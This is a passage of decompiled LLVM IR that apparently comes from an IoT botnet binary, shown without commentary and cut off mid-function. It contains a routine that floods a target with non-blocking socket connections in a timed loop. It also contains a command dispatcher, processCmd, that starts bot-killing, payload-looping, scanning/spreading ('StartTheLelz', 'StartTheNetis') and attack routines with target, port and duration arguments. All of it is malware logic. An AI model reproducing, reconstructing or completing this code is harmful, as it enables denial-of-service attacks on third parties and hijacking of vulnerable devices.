  %v0_112e4 = call i32 @getdtablesize()
  %tmp = icmp slt i32 %v0_112e4, 0
  %v3_112ec = zext i1 %tmp to i32
  %v2_112f0 = add i32 %v3_112ec, %v0_112e4
  %v3_112f4 = sdiv i32 %v2_112f0, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_11314 = urem i32 %arg2, 65536
  %v1_1131c = call i32 @htons(i32 %v3_11314)
  %v3_11340 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  %v2_11348 = icmp eq i32 %v3_11340, 0
  br i1 %v2_11348, label %dec_label_pc_11354, label %dec_label_pc_11874

dec_label_pc_11354:                               ; preds = %entry
  %v16_112c4 = ptrtoint i32* %stack_var_-20 to i32
  %v3_11370 = mul i32 %v3_112f4, 8
  %v1_11374 = or i32 %v3_11370, 3
  %v1_11378 = add i32 %v1_11374, 3
  %v3_1137c = and i32 %v1_11378, -4
  %v1_11384 = load i32, i32* @sp, align 4
  %v2_11384 = sub i32 %v1_11384, %v3_1137c
  %v1_11394 = add i32 %v2_11384, 7
  %v3_11398 = and i32 %v1_11394, -4
  %v2_113bc = mul i32 %v3_112f4, 5
  store i32 %v2_113bc, i32* @r2, align 4
  %v2_113d0 = inttoptr i32 %v3_11398 to i8*
  %v3_113d0 = call i32 @__GI_memset(i8* %v2_113d0, i32 0)
  %v1_113d8 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_113f4 = inttoptr i32 %v1_113d8 to i8*
  %v3_113f4 = call i32 @__GI_memset(i8* %v2_113f4, i32 0)
  %v2_113fc = call i32 @__GI_time(i32* null)
  store i32 %v2_113fc, i32* %r2.global-to-local, align 4
  %v2_11408 = add i32 %v2_113fc, %arg3
  %v2_11544 = ptrtoint i32* %stack_var_-204 to i32
  %v2_11608 = ptrtoint i32* %stack_var_-212 to i32
  %v2_11650 = ptrtoint i32* %stack_var_-216 to i32
  %v3_114e4 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v8_1185457 = icmp sgt i32 %v2_112f0, 1
  %v2_11430 = add i32 %v3_11398, 4
  %v2_115a0 = add i32 %v16_112c4, -184
  br label %dec_label_pc_1185c

dec_label_pc_11420:                               ; preds = %dec_label_pc_1184c.preheader, %dec_label_pc_11840
  %storemerge360 = phi i32 [ %v1_11844, %dec_label_pc_11840 ], [ 0, %dec_label_pc_1184c.preheader ]
  store i32 %v3_11398, i32* %r2.global-to-local, align 4
  %v3_1142c = mul i32 %storemerge360, 8
  %v2_11434 = add i32 %v2_11430, %v3_1142c
  %v1_11438 = inttoptr i32 %v2_11434 to i8*
  %v2_11438 = load i8, i8* %v1_11438, align 4
  %v6_11444 = icmp eq i8 %v2_11438, 0
  %v7_11444 = icmp eq i8 %v2_11438, 1
  br i1 %v7_11444, label %dec_label_pc_11558.lr.ph, label %dec_label_pc_1144c

dec_label_pc_1144c:                               ; preds = %dec_label_pc_11420
  %v7_11450 = icmp eq i8 %v2_11438, 2
  br i1 %v7_11450, label %dec_label_pc_1172c.lr.ph, label %dec_label_pc_11458

dec_label_pc_11458:                               ; preds = %dec_label_pc_1144c
  br i1 %v6_11444, label %dec_label_pc_11468, label %dec_label_pc_11840

dec_label_pc_11468:                               ; preds = %dec_label_pc_11458
  store i32 %storemerge360, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_11478 = call i32 @socket()
  %v2_11484 = load i32, i32* @r4, align 4
  %v5_11484 = mul i32 %v2_11484, 8
  %v6_11484 = add i32 %v5_11484, %v3_11398
  %v7_11484 = inttoptr i32 %v6_11484 to i32*
  store i32 %v0_11478, i32* %v7_11484, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_11490 = add i32 %v3_1142c, %v3_11398
  %v6_11490 = inttoptr i32 %v5_11490 to i32*
  %v7_11490 = load i32, i32* %v6_11490, align 4
  store i32 %v7_11490, i32* @r4, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_1149c = load i32, i32* %v6_11490, align 4
  store i32 0, i32* @r2, align 4
  %v2_114ac = call i32 @__libc_fcntl(i32 %v7_1149c, i32 3)
  %v1_114b4 = or i32 %v2_114ac, 2048
  %v0_114b8 = load i32, i32* @r4, align 4
  store i32 %v1_114b4, i32* @r2, align 4
  %v2_114c4 = call i32 @__libc_fcntl(i32 %v0_114b8, i32 4)
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_114d0 = load i32, i32* %v6_11490, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_114e4 = call i32 @__libc_connect(i32 %v7_114d0, %sockaddr* %v3_114e4, i32 16)
  %v3_114ec = icmp eq i32 %v4_114e4, -1
  br i1 %v3_114ec, label %dec_label_pc_114f4, label %dec_label_pc_11508

dec_label_pc_114f4:                               ; preds = %dec_label_pc_11468
  %v0_114f4 = call i32 @__errno_location()
  %v1_114fc = inttoptr i32 %v0_114f4 to i32*
  %v2_114fc = load i32, i32* %v1_114fc, align 4
  %v7_11500 = icmp eq i32 %v2_114fc, 115
  br i1 %v7_11500, label %dec_label_pc_11520, label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_11468, %dec_label_pc_114f4
  store i32 %v3_11398, i32* %r2.global-to-local, align 4
  %v7_11510 = load i32, i32* %v6_11490, align 4
  %v1_11518 = call i32 @__libc_close(i32 %v7_11510)
  br label %dec_label_pc_11840

dec_label_pc_11520:                               ; preds = %dec_label_pc_114f4
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_11558.lr.ph:                         ; preds = %dec_label_pc_11420
  br label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %dec_label_pc_11558.lr.ph, %dec_label_pc_11558
  %storemerge513 = phi i32 [ 0, %dec_label_pc_11558.lr.ph ], [ %v1_1156c, %dec_label_pc_11558 ]
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  %v5_11564 = mul nuw nsw i32 %storemerge513, 4
  %v6_11564 = add i32 %v5_11564, %v2_11544
  %v7_11564 = inttoptr i32 %v6_11564 to i32*
  store i32 0, i32* %v7_11564, align 4
  %v1_1156c = add nuw nsw i32 %storemerge513, 1
  %tmp50 = icmp ult i32 %v1_1156c, 32
  br i1 %tmp50, label %dec_label_pc_11558, label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %dec_label_pc_11558
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_11588 = add i32 %v3_1142c, %v3_11398
  %v6_11588 = inttoptr i32 %v5_11588 to i32*
  %v7_11588 = load i32, i32* %v6_11588, align 4
  %v3_1158c = udiv i32 %v7_11588, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_11598 = mul nuw nsw i32 %v3_1158c, 4
  %v2_115a4 = add i32 %v2_115a0, %v3_11598
  %v1_115a8 = inttoptr i32 %v2_115a4 to i32*
  %v2_115a8 = load i32, i32* %v1_115a8, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_115b4 = load i32, i32* %v6_11588, align 4
  %v1_115b8 = urem i32 %v7_115b4, 32
  %v6_115c0 = shl i32 1, %v1_115b8
  %v2_115c4 = or i32 %v6_115c0, %v2_115a8
  store i32 %v2_115c4, i32* %v1_115a8, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_115fc = load i32, i32* %v6_11588, align 4
  %v1_11600 = add i32 %v7_115fc, 1
  store i32 %v1_11600, i32* %r2.global-to-local, align 4
  %v1_1160c = load i32, i32* @sp, align 4
  %v2_1160c = inttoptr i32 %v1_1160c to i32*
  store i32 %v2_11608, i32* %v2_1160c, align 4
  %v0_11610 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  %v4_11620 = load i32, i32* %stack_var_-212, align 4
  %v5_11620 = call i32 @__libc_select(i32 %v0_11610, i32 0, i32 %v2_11544, i32 0, i32 %v4_11620)
  %v7_11630 = icmp eq i32 %v5_11620, 1
  br i1 %v7_11630, label %dec_label_pc_11638, label %dec_label_pc_116d4

dec_label_pc_11638:                               ; preds = %dec_label_pc_11580
  store i32 4, i32* %stack_var_-216, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11648 = load i32, i32* %v6_11588, align 4
  store i32 %v7_11648, i32* %r2.global-to-local, align 4
  %v1_11654 = load i32, i32* @sp, align 4
  %v2_11654 = inttoptr i32 %v1_11654 to i32*
  store i32 %v2_11650, i32* %v2_11654, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_11668 = call i32 @getsockopt()
  %v3_1166c = load i32, i32* %stack_var_-220, align 4
  %v2_11670 = icmp eq i32 %v3_1166c, 0
  br i1 %v2_11670, label %dec_label_pc_116b0, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %dec_label_pc_11638
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11680 = load i32, i32* %v6_11588, align 4
  %v1_11688 = call i32 @__libc_close(i32 %v7_11680)
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_116b0:                               ; preds = %dec_label_pc_11638
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_116d4:                               ; preds = %dec_label_pc_11580
  %v3_116d8 = icmp eq i32 %v5_11620, -1
  br i1 %v3_116d8, label %dec_label_pc_116e0, label %dec_label_pc_11840

dec_label_pc_116e0:                               ; preds = %dec_label_pc_116d4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_116e8 = load i32, i32* %v6_11588, align 4
  %v1_116f0 = call i32 @__libc_close(i32 %v7_116e8)
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_1172c.lr.ph:                         ; preds = %dec_label_pc_1144c
  br label %dec_label_pc_1172c

dec_label_pc_1172c:                               ; preds = %dec_label_pc_1172c.lr.ph, %dec_label_pc_1172c
  %storemerge49 = phi i32 [ 0, %dec_label_pc_1172c.lr.ph ], [ %v1_11740, %dec_label_pc_1172c ]
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  %v5_11738 = mul nuw nsw i32 %storemerge49, 4
  %v6_11738 = add i32 %v5_11738, %v2_11544
  %v7_11738 = inttoptr i32 %v6_11738 to i32*
  store i32 0, i32* %v7_11738, align 4
  %v1_11740 = add nuw nsw i32 %storemerge49, 1
  %tmp51 = icmp ult i32 %v1_11740, 32
  br i1 %tmp51, label %dec_label_pc_1172c, label %dec_label_pc_11754

dec_label_pc_11754:                               ; preds = %dec_label_pc_1172c
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_1175c = add i32 %v3_1142c, %v3_11398
  %v6_1175c = inttoptr i32 %v5_1175c to i32*
  %v7_1175c = load i32, i32* %v6_1175c, align 4
  %v3_11760 = udiv i32 %v7_1175c, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_1176c = mul nuw nsw i32 %v3_11760, 4
  %v2_11778 = add i32 %v2_115a0, %v3_1176c
  %v1_1177c = inttoptr i32 %v2_11778 to i32*
  %v2_1177c = load i32, i32* %v1_1177c, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11788 = load i32, i32* %v6_1175c, align 4
  %v1_1178c = urem i32 %v7_11788, 32
  %v6_11794 = shl i32 1, %v1_1178c
  %v2_11798 = or i32 %v6_11794, %v2_1177c
  store i32 %v2_11798, i32* %v1_1177c, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_117d0 = load i32, i32* %v6_1175c, align 4
  %v1_117d4 = add i32 %v7_117d0, 1
  store i32 %v1_117d4, i32* %r2.global-to-local, align 4
  %v1_117e0 = load i32, i32* @sp, align 4
  %v2_117e0 = inttoptr i32 %v1_117e0 to i32*
  store i32 %v2_11608, i32* %v2_117e0, align 4
  %v0_117e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_117f4 = load i32, i32* %stack_var_-212, align 4
  %v5_117f4 = call i32 @__libc_select(i32 %v0_117e4, i32 0, i32 0, i32 %v2_11544, i32 %v4_117f4)
  %v2_11804 = icmp eq i32 %v5_117f4, 0
  br i1 %v2_11804, label %dec_label_pc_11840, label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %dec_label_pc_11754
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11814 = load i32, i32* %v6_1175c, align 4
  %v1_1181c = call i32 @__libc_close(i32 %v7_11814)
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %dec_label_pc_11458, %dec_label_pc_116d4, %dec_label_pc_11754, %dec_label_pc_116e0, %dec_label_pc_116b0, %dec_label_pc_11678, %dec_label_pc_11520, %dec_label_pc_11508, %dec_label_pc_1180c
  %v1_11844 = add nuw nsw i32 %storemerge360, 1
  store i32 %v1_11844, i32* %r2.global-to-local, align 4
  %v5_11858 = icmp slt i32 %v1_11844, %v3_112f4
  br i1 %v5_11858, label %dec_label_pc_11420, label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %dec_label_pc_1184c.preheader, %dec_label_pc_11840, %dec_label_pc_11354
  %v2_11860 = call i32 @__GI_time(i32* null)
  store i32 %v2_11860, i32* %r2.global-to-local, align 4
  %v5_11870 = icmp slt i32 %v2_11860, %v2_11408
  br i1 %v5_11870, label %dec_label_pc_1184c.preheader, label %dec_label_pc_11874

dec_label_pc_1184c.preheader:                     ; preds = %dec_label_pc_1185c
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1185457, label %dec_label_pc_11420, label %dec_label_pc_1185c

dec_label_pc_11874:                               ; preds = %dec_label_pc_1185c, %entry
  %v12_1187c = phi i32 [ %v3_11340, %entry ], [ %v2_11860, %dec_label_pc_1185c ]
  %v2_1187c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1187c, i32* @r4, align 4
  store i32 %v6_112c4, i32* @fp, align 4
  ret i32 %v12_1187c

; uselistorder directives
  uselistorder i32 %v1_11844, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_11438, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_11434, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_1142c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge360, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 14, 13, 12, 11, 15 }
  uselistorder i32 %v2_11544, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_11398, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_112f4, { 1, 2, 0 }
  uselistorder i32 %v0_112e4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-212, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 39, 36, 35, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 38, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11840, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1172c, { 1, 0 }
  uselistorder label %dec_label_pc_11558, { 1, 0 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_11880 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_11880, i32* @ip, align 4
  %v3_11884 = load i32, i32* @r4, align 4
  %v6_11884 = load i32, i32* @r5, align 4
  %v9_11884 = load i32, i32* @r6, align 4
  %v12_11884 = load i32, i32* @r7, align 4
  %v15_11884 = load i32, i32* @r8, align 4
  %v18_11884 = load i32, i32* @fp, align 4
  store i32 71820, i32* %stack_var_-4, align 4
  %v2_11888 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11888, i32* @fp, align 4
  %v2_1189c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1d238.57 to i32), i32* @r1, align 4
  %v3_118a8 = inttoptr i32 %v2_1189c to i8*
  %v4_118a8 = call i32 @__GI_strcoll(i8* %v3_118a8, i32 ptrtoint ([5 x i8]* @global_var_1d238.57 to i32))
  %v2_118b0 = icmp eq i32 %v4_118a8, 0
  br i1 %v2_118b0, label %dec_label_pc_118b8, label %dec_label_pc_118d0

dec_label_pc_118b8:                               ; preds = %entry
  %v2_118bc = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_118c8 = call i32 @HackerPrint(i32 %v2_118bc, i32 ptrtoint ([6 x i8]* @global_var_21770.1201 to i32))
  br label %dec_label_pc_12bf8

dec_label_pc_118d0:                               ; preds = %entry
  %v2_118d4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_21778.1203 to i32), i32* @r1, align 4
  %v3_118e0 = inttoptr i32 %v2_118d4 to i8*
  %v4_118e0 = call i32 @__GI_strcoll(i8* %v3_118e0, i32 ptrtoint ([11 x i8]* @global_var_21778.1203 to i32))
  %v2_118e8 = icmp eq i32 %v4_118e0, 0
  br i1 %v2_118e8, label %dec_label_pc_118f0, label %dec_label_pc_1191c

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118d0
  %v2_118f4 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_118f4, i32* @r4, align 4
  %v2_118fc = load i32, i32* @global_var_31848.479, align 4
  store i32 %v2_118fc, i32* @r0, align 4
  %v1_11900 = call i32 @__GI_inet_ntoa(i32 %v2_118fc)
  %v0_11908 = load i32, i32* @r4, align 4
  store i32 %v1_11900, i32* @r2, align 4
  %v3_11914 = call i32 @HackerPrint(i32 %v0_11908, i32 ptrtoint ([10 x i8]* @global_var_21784.1206 to i32))
  br label %dec_label_pc_12bf8

dec_label_pc_1191c:                               ; preds = %dec_label_pc_118d0
  %v2_11920 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_21790.1208 to i32), i32* @r1, align 4
  %v3_1192c = inttoptr i32 %v2_11920 to i8*
  %v4_1192c = call i32 @__GI_strcoll(i8* %v3_1192c, i32 ptrtoint ([8 x i8]* @global_var_21790.1208 to i32))
  %v2_11934 = icmp eq i32 %v4_1192c, 0
  br i1 %v2_11934, label %dec_label_pc_1193c, label %dec_label_pc_11970

dec_label_pc_1193c:                               ; preds = %dec_label_pc_1191c
  %v0_1193c = call i32 @listFork()
  %v2_11944 = icmp eq i32 %v0_1193c, 0
  br i1 %v2_11944, label %dec_label_pc_1194c, label %dec_label_pc_11970

dec_label_pc_1194c:                               ; preds = %dec_label_pc_1193c
  %v2_11950 = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_1195c = call i32 @HackerPrint(i32 %v2_11950, i32 ptrtoint ([13 x i8]* @global_var_21798.1210 to i32))
  %v1_11960 = call i32 @botkiller(i32 %v3_1195c)
  %v1_11964 = call i32 @RemoveTMP(i32 %v1_11960)
  %v1_1196c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11970:                               ; preds = %dec_label_pc_1193c, %dec_label_pc_1191c
  %v2_11974 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_217a8.1212 to i32), i32* @r1, align 4
  %v3_11980 = inttoptr i32 %v2_11974 to i8*
  %v4_11980 = call i32 @__GI_strcoll(i8* %v3_11980, i32 ptrtoint ([7 x i8]* @global_var_217a8.1212 to i32))
  %v2_11988 = icmp eq i32 %v4_11980, 0
  br i1 %v2_11988, label %dec_label_pc_11990, label %dec_label_pc_119c0

dec_label_pc_11990:                               ; preds = %dec_label_pc_11970
  %v0_11990 = call i32 @listFork()
  %v2_11998 = icmp eq i32 %v0_11990, 0
  br i1 %v2_11998, label %dec_label_pc_119a0, label %dec_label_pc_119c0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11990
  %v2_119a4 = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_119b0 = call i32 @HackerPrint(i32 %v2_119a4, i32 ptrtoint ([16 x i8]* @global_var_217b0.1214 to i32))
  %v1_119b4 = call i32 @LoopPayload(i32 %v3_119b0)
  %v1_119bc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_119c0:                               ; preds = %dec_label_pc_11990, %dec_label_pc_11970
  %v2_119c4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_217c0.1216 to i32), i32* @r1, align 4
  %v3_119d0 = inttoptr i32 %v2_119c4 to i8*
  %v4_119d0 = call i32 @__GI_strcoll(i8* %v3_119d0, i32 ptrtoint ([7 x i8]* @global_var_217c0.1216 to i32))
  %v2_119d8 = icmp eq i32 %v4_119d0, 0
  br i1 %v2_119d8, label %dec_label_pc_119e0, label %dec_label_pc_11ae0

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119c0
  %v7_119e4 = icmp eq i32 %arg1, 2
  br i1 %v7_119e4, label %dec_label_pc_11a04, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e0
  %v2_119f0 = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_119fc = call i32 @HackerPrint(i32 %v2_119f0, i32 ptrtoint ([16 x i8]* @global_var_217c8.1218 to i32))
  br label %dec_label_pc_12bf8

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119e0
  %v1_11a08 = add i32 %tmp, 4
  %v1_11a0c = inttoptr i32 %v1_11a08 to i32*
  %v2_11a0c = load i32, i32* %v1_11a0c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_217d8.1220 to i32), i32* @r1, align 4
  %v3_11a18 = inttoptr i32 %v2_11a0c to i8*
  %v4_11a18 = call i32 @__GI_strcoll(i8* %v3_11a18, i32 ptrtoint ([4 x i8]* @global_var_217d8.1220 to i32))
  %v2_11a20 = icmp eq i32 %v4_11a18, 0
  br i1 %v2_11a20, label %dec_label_pc_11a28, label %dec_label_pc_11a6c

dec_label_pc_11a28:                               ; preds = %dec_label_pc_11a04
  %v2_11a2c = load i32, i32* @global_var_31850.1222, align 4
  %v2_11a30 = icmp eq i32 %v2_11a2c, 0
  br i1 %v2_11a30, label %dec_label_pc_12bf8, label %dec_label_pc_11a38

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a28
  %v0_11a48 = call i32 @kill()
  %v2_11a50 = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_11a5c = call i32 @HackerPrint(i32 %v2_11a50, i32 ptrtoint ([5 x i8]* @global_var_217dc.1224 to i32))
  store i32 0, i32* @global_var_31850.1222, align 4
  br label %dec_label_pc_11a6c

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_11a04, %dec_label_pc_11a38
  %v2_11a74 = load i32, i32* %v1_11a0c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_217e4.1226 to i32), i32* @r1, align 4
  %v3_11a80 = inttoptr i32 %v2_11a74 to i8*
  %v4_11a80 = call i32 @__GI_strcoll(i8* %v3_11a80, i32 ptrtoint ([3 x i8]* @global_var_217e4.1226 to i32))
  %v2_11a88 = icmp eq i32 %v4_11a80, 0
  br i1 %v2_11a88, label %dec_label_pc_11a90, label %dec_label_pc_11ae0

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a6c
  %v2_11a94 = load i32, i32* @global_var_31850.1222, align 4
  %v2_11a98 = icmp eq i32 %v2_11a94, 0
  br i1 %v2_11a98, label %dec_label_pc_11aa0, label %dec_label_pc_12bf8

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a90
  %v0_11aa0 = call i32 @__libc_fork()
  %v2_11ab0 = icmp eq i32 %v0_11aa0, 0
  br i1 %v2_11ab0, label %dec_label_pc_11ad4, label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11aa0
  store i32 %v0_11aa0, i32* @global_var_31850.1222, align 4
  br label %dec_label_pc_12bf8

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11aa0
  %v0_11ad4 = call i32 @StartTheLelz()
  %v1_11adc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11a6c, %dec_label_pc_119c0
  %v2_11ae4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_217e8.1228 to i32), i32* @r1, align 4
  %v3_11af0 = inttoptr i32 %v2_11ae4 to i8*
  %v4_11af0 = call i32 @__GI_strcoll(i8* %v3_11af0, i32 ptrtoint ([6 x i8]* @global_var_217e8.1228 to i32))
  %v2_11af8 = icmp eq i32 %v4_11af0, 0
  br i1 %v2_11af8, label %dec_label_pc_11b00, label %dec_label_pc_11b50

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11ae0
  %v7_11b04 = icmp eq i32 %arg1, 2
  br i1 %v7_11b04, label %dec_label_pc_11b0c, label %dec_label_pc_12bf8

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11b00
  %v1_11b10 = add i32 %tmp, 4
  %v1_11b14 = inttoptr i32 %v1_11b10 to i32*
  %v2_11b14 = load i32, i32* %v1_11b14, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_217e4.1226 to i32), i32* @r1, align 4
  %v3_11b20 = inttoptr i32 %v2_11b14 to i8*
  %v4_11b20 = call i32 @__GI_strcoll(i8* %v3_11b20, i32 ptrtoint ([3 x i8]* @global_var_217e4.1226 to i32))
  %v2_11b28 = icmp eq i32 %v4_11b20, 0
  br i1 %v2_11b28, label %dec_label_pc_11b30, label %dec_label_pc_11b50

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b0c
  %v2_11b34 = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_11b40 = call i32 @HackerPrint(i32 %v2_11b34, i32 ptrtoint ([25 x i8]* @global_var_217f0.1230 to i32))
  %v1_11b44 = call i32 @StartTheNetis(i32 %v3_11b40)
  %v1_11b4c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b0c, %dec_label_pc_11ae0
  %v2_11b54 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_2180c.1232 to i32), i32* @r1, align 4
  %v3_11b60 = inttoptr i32 %v2_11b54 to i8*
  %v4_11b60 = call i32 @__GI_strcoll(i8* %v3_11b60, i32 ptrtoint ([5 x i8]* @global_var_2180c.1232 to i32))
  %v2_11b68 = icmp eq i32 %v4_11b60, 0
  br i1 %v2_11b68, label %dec_label_pc_11b70, label %dec_label_pc_11cb4

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b50
  %v7_11b78 = icmp slt i32 %arg1, 4
  br i1 %v7_11b78, label %dec_label_pc_12bf8, label %dec_label_pc_11b7c

dec_label_pc_11b7c:                               ; preds = %dec_label_pc_11b70
  %v1_11b80 = add i32 %tmp, 8
  %v1_11b84 = inttoptr i32 %v1_11b80 to i32*
  %v2_11b84 = load i32, i32* %v1_11b84, align 4
  store i32 %v2_11b84, i32* @r0, align 4
  %v1_11b8c = call i32 @atol(i32 %v2_11b84)
  %tmp131 = icmp slt i32 %v1_11b8c, 1
  br i1 %tmp131, label %dec_label_pc_12bf8, label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b7c
  %v1_11ba0 = add i32 %tmp, 12
  %v1_11ba4 = inttoptr i32 %v1_11ba0 to i32*
  %v2_11ba4 = load i32, i32* %v1_11ba4, align 4
  store i32 %v2_11ba4, i32* @r0, align 4
  %v1_11bac = call i32 @atol(i32 %v2_11ba4)
  %v5_11bb8 = icmp sgt i32 %v1_11bac, 0
  br i1 %v5_11bb8, label %dec_label_pc_11bc0, label %dec_label_pc_12bf8

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11b9c
  %v1_11bc4 = add i32 %tmp, 4
  %v1_11bc8 = inttoptr i32 %v1_11bc4 to i32*
  %v2_11bc8 = load i32, i32* %v1_11bc8, align 4
  %v2_11bd8 = load i32, i32* %v1_11b84, align 4
  store i32 %v2_11bd8, i32* @r0, align 4
  %v1_11be0 = call i32 @atol(i32 %v2_11bd8)
  %v2_11bf4 = load i32, i32* %v1_11ba4, align 4
  store i32 %v2_11bf4, i32* @r0, align 4
  %v1_11bfc = call i32 @atol(i32 %v2_11bf4)
  %v2_11c14 = call i32 @__GI_strchr(i32 %v2_11bc8, i32 44)
  %v2_11c1c = icmp eq i32 %v2_11c14, 0
  br i1 %v2_11c1c, label %dec_label_pc_11c8c, label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11bc0
  store i32 %v2_11bc8, i32* @r0, align 4
  %v3_11c30 = call i32 @__GI_strtok(i32 %v2_11bc8, i32* nonnull @global_var_21744.1185)
